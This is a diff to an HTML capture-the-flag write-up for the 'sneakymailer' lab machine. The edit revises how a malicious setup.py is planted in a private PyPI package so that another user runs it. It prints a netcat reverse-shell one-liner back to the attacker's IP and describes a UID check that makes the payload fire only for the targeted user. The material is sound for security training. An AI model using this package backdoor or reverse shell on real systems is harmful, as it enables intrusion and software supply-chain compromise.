@@ -144,18 +144,37 @@ body {
 				<img src="images/sneaky/pypi-setup1.PNG" alt="pypi docs" class="inline"/>							<br/><br/><br/>
 					
 				The basic idea is that we build these on our host kali system, and then transfer them over to sneakymailer. We then		<br/>
-				run the setup.py file which will contain our malicious code. For our malicious code, we can just run a simple netcat		<br/>
-				one liner to send a reverse /bin/bash shell back to our machine. The command I will use is					<br/><br/><br/>
+				run the setup.py file which will contain our malicious code. For our pypirc file, we can set it up like so			<br/><br/>
+				<img src="images/sneaky/pypirc.PNG" alt="pypirc" class="inline"/>								<br/><br/><br/>
+					
+				For our malicious code, we can just run a simple netcat	one liner to send a reverse /bin/bash shell back to our machine. 	<br/>
+				The command I will use is													<br/><br/><br/>
 				
 				<code>
 				nc -e /bin/bash (my-ip-goes-here) (my-port-goes-here)
 				</code>  <br/><br/><br/>
 					
-				I created setup.py and .pypirc on my kali system like so									<br/><br/>
-				<img src="images/sneaky/setup-py.PNG" alt="setup.py" class="inline"/>								<br/><br/><br/>
-				<img src="images/sneaky/pypirc.PNG" alt="pypirc" class="inline"/>								<br/><br/><br/>
+				So I created my setup.py like below												<br/><br/>
+				<img src="images/sneaky/setup-old.PNG" alt="setup.py" class="inline"/>								<br/><br/><br/>
 					
-				I transferred these two files over into the /tmp directory on sneakymailer, and then added the /tmp directory into my path with	<br/><br/><br/>
+					
+				At this point I got a bit tripped up. Uploading a pypi package with the above two files will result in catching yet another	<br/>
+				shell as the dev user. The whole point of doing this was to pivot to the low user, and he should be executing these packages.	<br/>
+				So what is going on?														<br/><br/>
+					
+				<b>when we upload a package our setup.py code is actually ran twice</b>. It is ran the first time by our dev user (thats us 		<br/>
+				executing the upload on sneakymailer as the developer user). Then it is ran a 2nd time when the low user grabs and executes it. 	<br/>
+				What is happening here is our nc one liner is getting executed by the dev user first, which makes the reverse nc connection back 	<br/>
+				to us. Then when the low user also runs it, we have no idea of knowing since we have already caught a shell. We don't see the 2nd 	<br/>
+				connection attempt since we already have an established connection. My workaround, is to do a simple os.getuid() check to see if 	<br/>
+				we match low's UID. If we aren't currently executing as the low user, do nothing.							<br/><br/>
+				
+					
+				So I modified setup.py to only execite our nc one liner when running as user low						<br/><br/>
+				<img src="images/sneaky/setup-py.PNG" alt="setup.py" class="inline"/>								<br/><br/><br/>
+				
+					
+				I transferred setup.py and .pypirc over into the /tmp/ directory, and then added the /tmp/ directory into my path with		<br/><br/><br/>
 				
 				<code>
 				HOME=`pwd`
